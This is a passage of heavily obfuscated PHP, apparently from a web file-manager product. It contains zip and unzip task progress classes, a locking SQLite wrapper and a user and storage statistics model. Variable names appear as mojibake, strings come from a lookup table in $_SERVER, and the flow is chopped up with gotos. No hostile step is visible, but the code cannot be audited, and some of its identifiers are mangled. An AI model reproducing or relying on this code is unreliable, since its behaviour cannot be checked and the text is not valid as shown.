Hook::trigger($Úü‘˘À∏[619], $¶πÕπò); if (isset($¶πÕπò[$Úü‘˘À∏[615]]) && $¶πÕπò[$Úü‘˘À∏[615]]) { Hook::trigger($Úü‘˘À∏[620], $¶πÕπò); continue; } $Ÿ»˘˝Àè = $ç∞ç˘’≠->getPathInner($¶πÕπò[$Úü‘˘À∏[94]]); $îﬂ’‰ÓÙ = $≠≈›ıãÒ->addFileMake($Ÿ»˘˝Àè, $¶πÕπò[$Úü‘˘À∏[86]], $¶πÕπò[$Úü‘˘À∏[187]], $¶πÕπò[$Úü‘˘À∏[186]], $¶πÕπò[$Úü‘˘À∏[42]], $¿©≤√Á†); Hook::trigger($Úü‘˘À∏[620], $¶πÕπò); if (!is_array($îﬂ’‰ÓÙ)) { continue; } $™§ÿó‹é[] = $îﬂ’‰ÓÙ; } $≠≈›ıãÒ->addAll($™§ÿó‹é); $‡÷£Æ≤‘ = array($Úü‘˘À∏[186] => array($Úü‘˘À∏[17], array_keys($§Å„çÌ€))); $ûŒÿ‰õ¢ = $≠≈›ıãÒ->where($‡÷£Æ≤‘)->select(); $ûŒÿ‰õ¢ = $ûŒÿ‰õ¢ ? $ûŒÿ‰õ¢ : array(); foreach ($ûŒÿ‰õ¢ as $ãèÁøæÉ) { if (!isset($§Å„çÌ€[$ãèÁøæÉ[$Úü‘˘À∏[186]]])) { continue; } $É ƒ”ØŸ =& $§Å„çÌ€[$ãèÁøæÉ[$Úü‘˘À∏[186]]]; foreach ($É ƒ”ØŸ as &$¿à≥ùíπ) { $¿à≥ùíπ[$Úü‘˘À∏[477]] = $ãèÁøæÉ[$Úü‘˘À∏[477]]; } unset($¿à≥ùíπ); } $†˝ÁôÅÛ = array(); foreach ($´ÜøÙøÜ as $¿⁄ªπí∆) { $†˝ÁôÅÛ[$¿⁄ªπí∆[$Úü‘˘À∏[42]]] = $¿⁄ªπí∆; } return $†˝ÁôÅÛ; } } define($_SERVER[Á≈ ä ∞][621], $_SERVER[Á≈ ä ∞][622]); $xijlbqwfgo = $_SERVER[Á≈ ä ∞][623]; goto Cì≥Î◊Ñä±; BœÁøÊ’®Ø: class DbSqlite3 extends DbSqlite3Base { public function query($˘èÍµ∏Û) { $â˜“‡Ù˝ =& $_SERVER[Á≈ ä ∞]; if (!CacheLock::fileLock($â˜“‡Ù˝[23])) { return !1; } $Ôåﬁñ›◊ = parent::query($˘èÍµ∏Û); CacheLock::fileUnLock($â˜“‡Ù˝[23]); return $Ôåﬁñ›◊; } public function execute($Íú“¨·) { $¶˝∫Œ‡ı =& $_SERVER[Á≈ ä ∞]; if (!CacheLock::fileLock($¶˝∫Œ‡ı[23])) { return !1; } $†‘Æ∏π£ = parent::execute($Íú“¨·); CacheLock::fileUnLock($¶˝∫Œ‡ı[23]); return $†‘Æ∏π£; } } $_file = $_SERVER[$_SERVER[Á≈ ä ∞][15]]; $_size = $_SERVER[Á≈ ä ∞][879]; goto dÿë¿µ∏Ìô; f∆‰ŒúÍ∫¢: function binCheckBigger($Ωö÷Ùûø, $äÇ»ä‰ƒ) { return $Ωö÷Ùûø > $äÇ»ä‰ƒ; } $_SERVER[$_SERVER[ÚçüˆŸ”][3]] = (base64_decode('ODA5OQ==')."\60\63")+0;$_jzy9="6jb2u8istqkd0aephmo93lng5yr7fzvc41xwy0qk957sgxnwiav4ce2ut3jmhlro61bf8zp";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($êìîàΩß, $–ò¸ûı©) { $ñªÙŒ›‡ =& $_SERVER[Á≈ ä ∞]; if (isset(self::$_methodList[$êìîàΩß])) { return @call_user_func_array(self::$_methodList[$êìîàΩß], $–ò¸ûı©); } else { if (method_exists($this, $êìîàΩß)) { return call_user_func_array(array($this, $êìîàΩß), $–ò¸ûı©); } else { think_exception(__CLASS__ . $ñªÙŒ›‡[4] . $êìîàΩß . $ñªÙŒ›‡[5]); } } } public static function __callStatic($“´ÛÊîâ, $™õıñù˚) { if (isset(self::$_methodListStatic[$“´ÛÊîâ])) { return call_user_func_array(self::$_methodListStatic[$“´ÛÊîâ], $™õıñù˚); } else { if (method_exists(self, $“´ÛÊîâ)) { return call_user_func_array(array(self, $“´ÛÊîâ), $™õıñù˚); } else { show_json("{$“´ÛÊîâ}\50\51\x20\156\x6f\164\40\x65\170\x69\x73\x74\73", !1); } } } public static function addMethod($ü¶Ò•»—, $œ˜Àó˛») { self::$_methodList[$ü¶Ò•»—] = $œ˜Àó˛»; } public static function addMethodStatic($˜∏¶®ìë, $…˜¿Ú˘É) { self::$_methodListStatic[$˜∏¶®ìë] = $…˜¿Ú˘É; } } goto eºéı›·è®; aŒ©ëéï„∏: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Î˘Ê•¸Ç =& $_SERVER[Á≈ ä ∞]; parent::startAfter(); Hook::bind($Î˘Ê•¸Ç[1751], array($this, $Î˘Ê•¸Ç[1752])); Hook::bind($Î˘Ê•¸Ç[1197], array($this, $Î˘Ê•¸Ç[1753])); $ßÉ“ê¸∫ =& $this->task; $ßÉ“ê¸∫[$Î˘Ê•¸Ç[1754]] = $Î˘Ê•¸Ç[1202]; if (!$ßÉ“ê¸∫[$Î˘Ê•¸Ç[1557]]) { $ßÉ“ê¸∫[$Î˘Ê•¸Ç[1557]] = LNG($Î˘Ê•¸Ç[1755]); } } protected function endAfter() { $é∞˘åãê =& $_SERVER[Á≈ ä ∞]; parent::endAfter(); Hook::unbind($é∞˘åãê[1751], array($this, $é∞˘åãê[1752])); Hook::unbind($é∞˘åãê[1197], array($this, $é∞˘åãê[1753])); } public function updateAfter() { $∆±èîÊ˘ =& $_SERVER[Á≈ ä ∞]; $™óÂÈ›€ =& $this->task; if (!$™óÂÈ›€[$∆±èîÊ˘[793]] || !$™óÂÈ›€[$∆±èîÊ˘[770]]) { return; } if ($™óÂÈ›€[$∆±èîÊ˘[1754]] == $∆±èîÊ˘[1202]) { $ï•ÒÌ˘Ö = 0; if ($™óÂÈ›€[$∆±èîÊ˘[1709]]) { $ï•ÒÌ˘Ö = $™óÂÈ›€[$∆±èîÊ˘[1710]] / $™óÂÈ›€[$∆±èîÊ˘[1709]]; } $™óÂÈ›€[$∆±èîÊ˘[1660]] = $ï•ÒÌ˘Ö * 0.3; } else { if ($™óÂÈ›€[$∆±èîÊ˘[1754]] == $∆±èîÊ˘[322]) { $ï•ÒÌ˘Ö = $™óÂÈ›€[$∆±èîÊ˘[1659]] / $™óÂÈ›€[$∆±èîÊ˘[793]]; $™óÂÈ›€[$∆±èîÊ˘[1660]] = 0.3 + $ï•ÒÌ˘Ö * 0.4; } else { if ($™óÂÈ›€[$∆±èîÊ˘[1754]] == $∆±èîÊ˘[117]) { $Ì≠è¡˛“ = 0; if ($™óÂÈ›€[$∆±èîÊ˘[1711]] == $∆±èîÊ˘[117]) { $Ì≠è¡˛“ = $™óÂÈ›€[$∆±èîÊ˘[1710]]; } $ï•ÒÌ˘Ö = ($™óÂÈ›€[$∆±èîÊ˘[1714]] + $Ì≠è¡˛“) / $™óÂÈ›€[$∆±èîÊ˘[770]]; $™óÂÈ›€[$∆±èîÊ˘[1660]] = 0.3 + 0.4 + $ï•ÒÌ˘Ö * 0.3; } } } if ($™óÂÈ›€[$∆±èîÊ˘[1660]] > 0) { $¢¨êîŸ“ = timeFloat() - $™óÂÈ›€[$∆±èîÊ˘[1662]] - $™óÂÈ›€[$∆±èîÊ˘[1665]]; $™óÂÈ›€[$∆±èîÊ˘[1666]] = $¢¨êîŸ“ * (1 - $™óÂÈ›€[$∆±èîÊ˘[1660]]) / $™óÂÈ›€[$∆±èîÊ˘[1660]]; } } public function addFile($´ÕË∫“¥) { $∑Ø–˚…√ =& $_SERVER[Á≈ ä ∞]; $è–ÂŸππ =& $this->task; $÷¬ñî≥œ = IO::info($´ÕË∫“¥); $è–ÂŸππ[$∑Ø–˚…√[1707]] = $÷¬ñî≥œ[$∑Ø–˚…√[42]]; $è–ÂŸππ[$∑Ø–˚…√[1709]] = $÷¬ñî≥œ[$∑Ø–˚…√[86]]; $è–ÂŸππ[$∑Ø–˚…√[1710]] = 0; $è–ÂŸππ[$∑Ø–˚…√[1067]] = $∑Ø–˚…√[1730]; $è–ÂŸππ[$∑Ø–˚…√[1711]] = $∑Ø–˚…√[1202]; $è–ÂŸππ[$∑Ø–˚…√[770]] = $÷¬ñî≥œ[$∑Ø–˚…√[86]]; $è–ÂŸππ[$∑Ø–˚…√[793]] = 1; $”∆´ìÂá = 0; $è–ÂŸππ[$∑Ø–˚…√[1718]] = array($∑Ø–˚…√[1719] => $”∆´ìÂá + 1, $∑Ø–˚…√[429] => $÷¬ñî≥œ[$∑Ø–˚…√[42]], $∑Ø–˚…√[94] => $÷¬ñî≥œ[$∑Ø–˚…√[94]], $∑Ø–˚…√[528] => $÷¬ñî≥œ[$∑Ø–˚…√[528]] ? $÷¬ñî≥œ[$∑Ø–˚…√[528]] : $÷¬ñî≥œ[$∑Ø–˚…√[94]]); $this->update(); } public function unzipAfter($˚∞—ÙËπ) { $é–¥º¶û =& $_SERVER[Á≈ ä ∞]; $ö◊ñäêü =& $this->task; $ö◊ñäêü[$é–¥º¶û[1754]] = $é–¥º¶û[117]; $¢êæ˘ò∫ = IO::infoWithChildren($˚∞—ÙËπ); $§˝Çá±© = 0; $ö◊ñäêü[$é–¥º¶û[1718]] = array($é–¥º¶û[1719] => $§˝Çá±© + 1, $é–¥º¶û[429] => $¢êæ˘ò∫[$é–¥º¶û[42]], $é–¥º¶û[94] => $¢êæ˘ò∫[$é–¥º¶û[94]], $é–¥º¶û[528] => $¢êæ˘ò∫[$é–¥º¶û[528]] ? $¢êæ˘ò∫[$é–¥º¶û[528]] : $¢êæ˘ò∫[$é–¥º¶û[94]]); if ($¢êæ˘ò∫[$é–¥º¶û[43]] == $é–¥º¶û[209]) { $ö◊ñäêü[$é–¥º¶û[793]] = 1; } else { $ö◊ñäêü[$é–¥º¶û[793]] = $¢êæ˘ò∫[$é–¥º¶û[89]][$é–¥º¶û[87]]; } $ö◊ñäêü[$é–¥º¶û[1067]] = $é–¥º¶û[22]; $ö◊ñäêü[$é–¥º¶û[1711]] = 0; $ö◊ñäêü[$é–¥º¶û[1659]] = 0; $ö◊ñäêü[$é–¥º¶û[1709]] = 0; $ö◊ñäêü[$é–¥º¶û[1710]] = 0; $ö◊ñäêü[$é–¥º¶û[1707]] = $é–¥º¶û[22]; $ö◊ñäêü[$é–¥º¶û[1714]] = 0; $ö◊ñäêü[$é–¥º¶û[770]] = $¢êæ˘ò∫[$é–¥º¶û[86]]; $this->update(); self::log($é–¥º¶û[1756] . json_encode(array($ö◊ñäêü, $¢êæ˘ò∫))); } public function nameParse($Ö‚ãªÀß) { $ØÓÃ†ƒ∂ =& $_SERVER[Á≈ ä ∞]; $≠¬˛µû∫ =& $this->task; if ($≠¬˛µû∫[$ØÓÃ†ƒ∂[1754]] == $ØÓÃ†ƒ∂[1202]) { $≠¬˛µû∫[$ØÓÃ†ƒ∂[1754]] = $ØÓÃ†ƒ∂[322]; $≠¬˛µû∫[$ØÓÃ†ƒ∂[1714]] = 0; $≠¬˛µû∫[$ØÓÃ†ƒ∂[770]] = 0; } $Ò¬‹äÌ¶ = get_path_this($Ö‚ãªÀß); if (strstr($Ò¬‹äÌ¶, $ØÓÃ†ƒ∂[20])) { $≠¬˛µû∫[$ØÓÃ†ƒ∂[1659]] += 1; $≠¬˛µû∫[$ØÓÃ†ƒ∂[793]] += 1; } $≠¬˛µû∫[$ØÓÃ†ƒ∂[1707]] = $Ö‚ãªÀß; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $›Ô€ﬂ«· =& $_SERVER[Á≈ ä ∞]; parent::startAfter(); Hook::bind($›Ô€ﬂ«·[1757], array($this, $›Ô€ﬂ«·[1752])); $ÛÙåüƒ˝ =& $this->task; $ÛÙåüƒ˝[$›Ô€ﬂ«·[1754]] = $›Ô€ﬂ«·[1202]; if (!$ÛÙåüƒ˝[$›Ô€ﬂ«·[1557]]) { $ÛÙåüƒ˝[$›Ô€ﬂ«·[1557]] = LNG($›Ô€ﬂ«·[1758]); } } protected function endAfter() { $Ìñ•Ï«™ =& $_SERVER[Á≈ ä ∞]; parent::endAfter(); Hook::unbind($Ìñ•Ï«™[1757], array($this, $Ìñ•Ï«™[1752])); } public function updateAfter() { $öêƒÕúø =& $_SERVER[Á≈ ä ∞]; $˙¨îÑò˝ =& $this->task; if (!$˙¨îÑò˝[$öêƒÕúø[793]] || !$˙¨îÑò˝[$öêƒÕúø[770]]) { return; } if ($˙¨îÑò˝[$öêƒÕúø[1754]] == $öêƒÕúø[1202]) { $ä¨º˝” = $˙¨îÑò˝[$öêƒÕúø[1710]]; if ($˙¨îÑò˝[$öêƒÕúø[1711]] != $öêƒÕúø[1202]) { $ä¨º˝” = 0; } $≠«˙â˝’ = ($˙¨îÑò˝[$öêƒÕúø[1714]] + $ä¨º˝”) / $˙¨îÑò˝[$öêƒÕúø[770]]; $˙¨îÑò˝[$öêƒÕúø[1660]] = $≠«˙â˝’ * 0.3; } else { if ($˙¨îÑò˝[$öêƒÕúø[1754]] == $öêƒÕúø[322]) { $≠«˙â˝’ = $˙¨îÑò˝[$öêƒÕúø[1659]] / $˙¨îÑò˝[$öêƒÕúø[793]]; $˙¨îÑò˝[$öêƒÕúø[1660]] = 0.3 + $≠«˙â˝’ * 0.5; } else { if ($˙¨îÑò˝[$öêƒÕúø[1754]] == $öêƒÕúø[117]) { $≠«˙â˝’ = 0; if ($˙¨îÑò˝[$öêƒÕúø[1709]]) { $≠«˙â˝’ = $˙¨îÑò˝[$öêƒÕúø[1710]] / $˙¨îÑò˝[$öêƒÕúø[1709]]; } $˙¨îÑò˝[$öêƒÕúø[1660]] = 0.3 + 0.5 + $≠«˙â˝’ * 0.2; } } } if ($˙¨îÑò˝[$öêƒÕúø[1660]] > 0) { $ÓıöÏ∞ç = timeFloat() - $˙¨îÑò˝[$öêƒÕúø[1662]] - $˙¨îÑò˝[$öêƒÕúø[1665]]; $˙¨îÑò˝[$öêƒÕúø[1666]] = $ÓıöÏ∞ç * (1 - $˙¨îÑò˝[$öêƒÕúø[1660]]) / $˙¨îÑò˝[$öêƒÕúø[1660]]; } } public function copyFileStart($ﬁ°ˆ÷é¿, $™ÔáòÙª, $ŸÃü¢Â·, $Œ≈õóÉö, $ã—ò‹ÂË, $‰Ω∏Ëíá) { $ı∏˚”æ =& $_SERVER[Á≈ ä ∞]; parent::copyFileStart($ﬁ°ˆ÷é¿, $™ÔáòÙª, $ŸÃü¢Â·, $Œ≈õóÉö, $ã—ò‹ÂË, $‰Ω∏Ëíá); $∫∂Ò≤∂© =& $this->task; if ($∫∂Ò≤∂©[$ı∏˚”æ[1754]] == $ı∏˚”æ[322]) { $∫∂Ò≤∂©[$ı∏˚”æ[1754]] = $ı∏˚”æ[117]; } $this->update(); } public function copyFileEnd($ºœ›Ä¨ù, $ÎîêıÙ˘, $ªÉèÜ´˙, $Ñ€ÜÅÙ, $∑”Áèà›, $π—∑Äß´) { $˜®ë±¡ƒ =& $_SERVER[Á≈ ä ∞]; $˛ó§Ú∆È =& $this->task; $˛ó§Ú∆È[$˜®ë±¡ƒ[1710]] = $˛ó§Ú∆È[$˜®ë±¡ƒ[1709]]; $˛ó§Ú∆È[$˜®ë±¡ƒ[1714]] += $˛ó§Ú∆È[$˜®ë±¡ƒ[1709]]; $˛ó§Ú∆È[$˜®ë±¡ƒ[1711]] = $˜®ë±¡ƒ[22]; $this->update(); } public function nameParse($óèÜ’¥‡) { $ƒ≥ùÔπΩ =& $_SERVER[Á≈ ä ∞]; $«Ë˘ΩΩ¯ =& $this->task; if ($«Ë˘ΩΩ¯[$ƒ≥ùÔπΩ[1659]] < $«Ë˘ΩΩ¯[$ƒ≥ùÔπΩ[793]]) { $¬éı÷π  = get_path_this($óèÜ’¥‡); if (strstr($¬éı÷π , $ƒ≥ùÔπΩ[20])) { $«Ë˘ΩΩ¯[$ƒ≥ùÔπΩ[1659]] += 1; } } if ($«Ë˘ΩΩ¯[$ƒ≥ùÔπΩ[1754]] == $ƒ≥ùÔπΩ[1202]) { $«Ë˘ΩΩ¯[$ƒ≥ùÔπΩ[1754]] = $ƒ≥ùÔπΩ[322]; } $«Ë˘ΩΩ¯[$ƒ≥ùÔπΩ[1707]] = $óèÜ’¥‡; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ê∂∏∞äÆ) { $ÖŸ†Óë¸ =& $_SERVER[Á≈ ä ∞]; $≈ì—‹éÙ = array($ÖŸ†Óë¸[609] => array($ÖŸ†Óë¸[43] => $ÖŸ†Óë¸[1759], $ÖŸ†Óë¸[282] => array($ÖŸ†Óë¸[234], $ÖŸ†Óë¸[772], $ÖŸ†Óë¸[1760], $ÖŸ†Óë¸[1761])), $ÖŸ†Óë¸[1762] => array($ÖŸ†Óë¸[43] => $ÖŸ†Óë¸[1763], $ÖŸ†Óë¸[282] => array($ÖŸ†Óë¸[234], $ÖŸ†Óë¸[770], $ÖŸ†Óë¸[1764], $ÖŸ†Óë¸[1765], $ÖŸ†Óë¸[1766]))); if (!isset($≈ì—‹éÙ[$Ê∂∏∞äÆ])) { return !1; } $this->optionType = $≈ì—‹éÙ[$Ê∂∏∞äÆ][$ÖŸ†Óë¸[43]]; $this->field = $≈ì—‹éÙ[$Ê∂∏∞äÆ][$ÖŸ†Óë¸[282]]; return !0; } public function listData($ˆ”¯∆¨â = false, $ùÍÀΩÄ  = "\155\157\144\151\x66\x79\x54\x69\155\x65", $·√Ñ†Ô¶ = false) { return parent::listData($ˆ”¯∆¨â, $ùÍÀΩÄ , $·√Ñ†Ô¶); } public function trendList($Å€©∆Ä™) { $Ó£»ú“˝ =& $_SERVER[Á≈ ä ∞]; $˙°úã˝⁄ = $this->listData(); if ($˙°úã˝⁄) { $÷∆íﬁﬁû = end($˙°úã˝⁄); $Å•…Ó˙µ = date($Ó£»ú“˝[1767], strtotime($Ó£»ú“˝[1768])); if ($÷∆íﬁﬁû[$Ó£»ú“˝[234]] == $Å•…Ó˙µ) { return $˙°úã˝⁄; } $ÉÎøÎ∞Ó = strtotime($÷∆íﬁﬁû[$Ó£»ú“˝[234]]); } if (!isset($ÉÎøÎ∞Ó)) { $¸„ò•∏Â = $Å€©∆Ä™ == $Ó£»ú“˝[609] ? $Ó£»ú“˝[544] : $Ó£»ú“˝[832]; $ÉÎøÎ∞Ó = Model($¸„ò•∏Â)->min($Ó£»ú“˝[210]); } $ÕÇÒ¬ı = $Ó£»ú“˝[1769] . ucfirst($Å€©∆Ä™); $ﬂØôÌºÒ = $this->dateList($ÉÎøÎ∞Ó); foreach ($ﬂØôÌºÒ as $Å•…Ó˙µ) { $this->{$ÕÇÒ¬ı}($Å•…Ó˙µ); } return $this->listData(); } private function dateList($˙ÔÚ∑ﬁ∏) { $‚Õ˜¯á¥ =& $_SERVER[Á≈ ä ∞]; $˙ÖÁœÈ˙ = $˙ÔÚ∑ﬁ∏; $∑ƒÛØ¯ = strtotime($‚Õ˜¯á¥[1768]); $Í§≥Õ©˛ = array(); while ($˙ÖÁœÈ˙ <= $∑ƒÛØ¯) { $Í§≥Õ©˛[] = date($‚Õ˜¯á¥[1767], $˙ÖÁœÈ˙); $˙ÖÁœÈ˙ = strtotime($‚Õ˜¯á¥[1770], $˙ÖÁœÈ˙); } return $Í§≥Õ©˛; } public function _recordUser($êçÏ€‘À = '') { $∏»Ù¯Ù≥ =& $_SERVER[Á≈ ä ∞]; $¢ÔÍ˙ëŒ = strtotime(date($∏»Ù¯Ù≥[1771], strtotime($êçÏ€‘À))); $á¡Ñ∂∂∫ = strtotime(date($∏»Ù¯Ù≥[1772], strtotime($êçÏ€‘À))); $ù∞ÄÔ÷® = array($∏»Ù¯Ù≥[210] => array($∏»Ù¯Ù≥[1016], $á¡Ñ∂∂∫)); $Ã¥»ùÜ≠ = Model($∏»Ù¯Ù≥[544])->where($ù∞ÄÔ÷®)->count($∏»Ù¯Ù≥[1658]); $ù∞ÄÔ÷®[$∏»Ù¯Ù≥[210]] = array($∏»Ù¯Ù≥[342], array($¢ÔÍ˙ëŒ, $á¡Ñ∂∂∫)); $å™ˆ≈À‹ = Model($∏»Ù¯Ù≥[544])->where($ù∞ÄÔ÷®)->count($∏»Ù¯Ù≥[1658]); $ù∞ÄÔ÷®[$∏»Ù¯Ù≥[43]] = $∏»Ù¯Ù≥[1773]; $ï…∫«æØ = Model($∏»Ù¯Ù≥[1774])->where($ù∞ÄÔ÷®)->count($∏»Ù¯Ù≥[1775]); $πÈ”§∏Ω = array($∏»Ù¯Ù≥[234] => $êçÏ€‘À, $∏»Ù¯Ù≥[772] => (int) $Ã¥»ùÜ≠, $∏»Ù¯Ù≥[1760] => (int) $å™ˆ≈À‹, $∏»Ù¯Ù≥[1761] => (int) $ï…∫«æØ); return $this->insert($πÈ”§∏Ω); } public function _recordStore($¬˚˜€Úè = '') { $÷Íﬂ§ı© =& $_SERVER[Á≈ ä ∞]; $Ã°œ˝¢ = strtotime(date($÷Íﬂ§ı©[1772], strtotime($¬˚˜€Úè))); $À˝Æ’¨ÿ = array($÷Íﬂ§ı©[210] => array($÷Íﬂ§ı©[1016], $Ã°œ˝¢)); $ôú˙Û—˝ = Model($÷Íﬂ§ı©[480])->where($À˝Æ’¨ÿ)->sum($÷Íﬂ§ı©[86]); $À˝Æ’¨ÿ[$÷Íﬂ§ı©[419]] = 0; $‘˘Á¢ß˝ = Model($÷Íﬂ§ı©[832])->where($À˝Æ’¨ÿ)->sum($÷Íﬂ§ı©[86]); $À˝Æ’¨ÿ[$÷Íﬂ§ı©[420]] = 1; $ê˚π”ûÖ = Model($÷Íﬂ§ı©[832])->where($À˝Æ’¨ÿ)->sum($÷Íﬂ§ı©[86]); $À˝Æ’¨ÿ[$÷Íﬂ§ı©[420]] = 2; $ÕﬂúË‚â = Model($÷Íﬂ§ı©[832])->where($À˝Æ’¨ÿ)->sum($÷Íﬂ§ı©[86]); $˙˛“µƒó = array($÷Íﬂ§ı©[234] => $¬˚˜€Úè, $÷Íﬂ§ı©[770] => (int) $‘˘Á¢ß˝, $÷Íﬂ§ı©[1764] => (int) $ôú˙Û—˝, $÷Íﬂ§ı©[1765] => (int) $ê˚π”ûÖ, $÷Íﬂ§ı©[1766] => (int) $ÕﬂúË‚â); return $this->insert($˙˛“µƒó); } public function trend($ÌÍ∏˙éà, $¶ÁÈÉ–∑) { $˝í∫ıπÎ =& $_SERVER[Á≈ ä ∞]; if (!$this->init($ÌÍ∏˙éà)) { return !1; } $ô‘Ó“⁄Ç = $this->trendList($ÌÍ∏˙éà); if ($ô‘Ó“⁄Ç && $¶ÁÈÉ–∑ != $˝í∫ıπÎ[1631]) { $èÔºœﬁ¡ = $ô‘Ó“⁄Ç[0][$˝í∫ıπÎ[234]]; $àµÒ«Ñ = $this->validDate($¶ÁÈÉ–∑, $èÔºœﬁ¡); $∆æº∑∂ò = array(); $Ùó’∫ãÃ = array_to_keyvalue($ô‘Ó“⁄Ç, $˝í∫ıπÎ[234]); foreach ($àµÒ«Ñ as $úÉÔÛ€Œ) { if (isset($Ùó’∫ãÃ[$úÉÔÛ€Œ])) { $‹£Ãí⁄≤ = $Ùó’∫ãÃ[$úÉÔÛ€Œ]; } else { $‹£Ãí⁄≤ = end($ô‘Ó“⁄Ç); $‹£Ãí⁄≤[$˝í∫ıπÎ[234]] = $úÉÔÛ€Œ; if ($ÌÍ∏˙éà == $˝í∫ıπÎ[609]) { $‹£Ãí⁄≤[$˝í∫ıπÎ[1760]] = $‹£Ãí⁄≤[$˝í∫ıπÎ[1761]] = 0; } } $∆æº∑∂ò[] = $‹£Ãí⁄≤; } $ô‘Ó“⁄Ç = $∆æº∑∂ò; } $∏í®˚»æ = array($˝í∫ıπÎ[609] => array($˝í∫ıπÎ[772] => LNG($˝í∫ıπÎ[1776]), $˝í∫ıπÎ[1760] => LNG($˝í∫ıπÎ[1777]), $˝í∫ıπÎ[1761] => LNG($˝í∫ıπÎ[1778])), $˝í∫ıπÎ[1762] => array($˝í∫ıπÎ[770] => LNG($˝í∫ıπÎ[1779]), $˝í∫ıπÎ[1764] => LNG($˝í∫ıπÎ[1780]), $˝í∫ıπÎ[1765] => LNG($˝í∫ıπÎ[1781]), $˝í∫ıπÎ[1766] => LNG($˝í∫ıπÎ[1782]))); $“¬Á¢ó˝ = array($˝í∫ıπÎ[609] => $˝í∫ıπÎ[1783], $˝í∫ıπÎ[1762] => $˝í∫ıπÎ[86]); if (empty($ô‘Ó“⁄Ç)) { $úÉÔÛ€Œ = date($˝í∫ıπÎ[1767], strtotime($˝í∫ıπÎ[1768])); $¯®¨≥âô = array($˝í∫ıπÎ[234] => $úÉÔÛ€Œ); foreach ($∏í®˚»æ[$ÌÍ∏˙éà] as $Ìüì÷ò… => $®Ó•°‡‹) { $¯®¨≥âô[$Ìüì÷ò…] = 0; } $ô‘Ó“⁄Ç[] = $¯®¨≥âô; } $åŒ¡®‡ÿ = array(); foreach ($ô‘Ó“⁄Ç as $®Ó•°‡‹) { if ($ÌÍ∏˙éà == $˝í∫ıπÎ[1762] && $®Ó•°‡‹[$˝í∫ıπÎ[1764]] > $®Ó•°‡‹[$˝í∫ıπÎ[770]]) { $®Ó•°‡‹[$˝í∫ıπÎ[1764]] = $®Ó•°‡‹[$˝í∫ıπÎ[770]]; } foreach ($∏í®˚»æ[$ÌÍ∏˙éà] as $Ìüì÷ò… => $™ãÃÜ…œ) { $‹£Ãí⁄≤ = array($˝í∫ıπÎ[234] => $®Ó•°‡‹[$˝í∫ıπÎ[234]], $˝í∫ıπÎ[1557] => $™ãÃÜ…œ); $‹£Ãí⁄≤[$“¬Á¢ó˝[$ÌÍ∏˙éà]] = isset($®Ó•°‡‹[$Ìüì÷ò…]) ? $®Ó•°‡‹[$Ìüì÷ò…] : 0; $åŒ¡®‡ÿ[] = $‹£Ãí⁄≤; } } return $åŒ¡®‡ÿ; } public function validDate($ì◊ÊµñÒ, $òøÔæÉ±) { $í¯ñ◊Á =& $_SERVER[Á≈ ä ∞]; $˛Ñõ‡ˆç = date($í¯ñ◊Á[1767], strtotime($í¯ñ◊Á[1768])); $Í´¸ßÅ± = array($˛Ñõ‡ˆç); switch ($ì◊ÊµñÒ) { case $í¯ñ◊Á[1638]: $ß∂˙˚ø¬ = mktime(0, 0, 0, date($í¯ñ◊Á[1784]), date($í¯ñ◊Á[1378]) - date($í¯ñ◊Á[1441]) + 7 - 7, date($í¯ñ◊Á[1785])); $±µïóÆç = 0; do { $Äòç ä˘ = date($í¯ñ◊Á[1767], $ß∂˙˚ø¬ - 3600 * 24 * 7 * $±µïóÆç); $Í´¸ßÅ±[] = $Äòç ä˘; $±µïóÆç++; } while ($òøÔæÉ± < $Äòç ä˘); break; case $í¯ñ◊Á[1636]: $±µïóÆç = 1; do { $Èäõìëª = date($í¯ñ◊Á[1786], strtotime("\x2d\40{$±µïóÆç}\40\x6d\x6f\156\x74\150\163")); $Í´¸ßÅ±[] = $Èäõìëª; $±µïóÆç++; } while ($òøÔæÉ± < $Èäõìëª); break; case $í¯ñ◊Á[1787]: $ìÇõûÿ = (int) date($í¯ñ◊Á[1785], strtotime($òøÔæÉ±)); $ò¿õ§∆∂ = (int) date($í¯ñ◊Á[1785]); if ($ìÇõûÿ >= $ò¿õ§∆∂) { break; } for ($ìÇõûÿ; $ìÇõûÿ < $ò¿õ§∆∂; $ìÇõûÿ++) { $Í´¸ßÅ±[] = $ìÇõûÿ . $í¯ñ◊Á[1788]; } break; default: break; } if ($òøÔæÉ± > end($Í´¸ßÅ±)) { array_pop($Í´¸ßÅ±); } sort($Í´¸ßÅ±); return $Í´¸ßÅ±; } public function listTable($ú˛•ıü•) { $ıı≠ê¨á = ucfirst($ú˛•ıü•); return Model($ıı≠ê¨á)->listData(); } public function option($·ÕË¢£ú) { $ÑÀÀ⁄µß = $_SERVER[Á≈ ä ∞][1789] . ucfirst($·ÕË¢£ú); return $this->{$ÑÀÀ⁄µß}(); } private function optionUser() { $ï’œÛ‡° =& $_SERVER[Á≈ ä ∞]; $æﬂùñî‚ = Model($ï’œÛ‡°[544])->count($ï’œÛ‡°[1658]); $ı€◊ÊØ∆ = Model($ï’œÛ‡°[544])->where($ï’œÛ‡°[1790])->count($ï’œÛ‡°[1658]); $öÿÎñÓø = intval($GLOBALS[$ï’œÛ‡°[16]][$ï’œÛ‡°[358]][$ï’œÛ‡°[1613]]) / 3600; $›à–öÂﬂ = strtotime("\x2d{$öÿÎñÓø}\x20\150\157\165\x72\163"); $à˛ÕÜÊ≥ = strtotime(date($ï’œÛ‡°[1771])); if ($›à–öÂﬂ < $à˛ÕÜÊ≥) { $›à–öÂﬂ = $à˛ÕÜÊ≥; } $Óıüì¥¸ = array($ï’œÛ‡°[1791] => array($ï’œÛ‡°[1017], $›à–öÂﬂ)); $—¡è˚Ω… = (int) Model($ï’œÛ‡°[544])->where($Óıüì¥¸)->count($ï’œÛ‡°[1658]); if (!$—¡è˚Ω…) { $—¡è˚Ω… = 1; } $Óıüì¥¸ = array($ï’œÛ‡°[1791] => array($ï’œÛ‡°[1017], $à˛ÕÜÊ≥)); $ÜÙ¶Úáœ = Model($ï’œÛ‡°[544])->where($Óıüì¥¸)->count($ï’œÛ‡°[1658]); return array($ï’œÛ‡°[766] => (int) $æﬂùñî‚, $ï’œÛ‡°[1792] => (int) ($æﬂùñî‚ - $ı€◊ÊØ∆), $ï’œÛ‡°[1793] => (int) $ı€◊ÊØ∆, $ï’œÛ‡°[1794] => (int) $ÜÙ¶Úáœ, $ï’œÛ‡°[1795] => $—¡è˚Ω…); } private function optionFile() { 